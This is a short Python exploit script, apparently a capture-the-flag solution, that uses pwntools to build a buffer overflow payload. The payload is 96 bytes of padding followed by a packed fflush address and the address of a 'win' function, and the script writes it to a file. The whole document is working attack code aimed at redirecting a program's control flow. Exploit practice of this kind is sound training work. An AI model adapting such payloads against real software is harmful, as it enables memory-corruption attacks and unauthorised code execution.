from pwn import *

padding = 'A'.encode() * 96
fflush_address = 0x08048430
win_address = 0x080485e3



payload = padding + p32(fflush_address) +b'\n'+ str(win_address).encode() + b'\n'+ b'10'

print(payload)

with open('payload','wb') as file:
    file.write(payload)
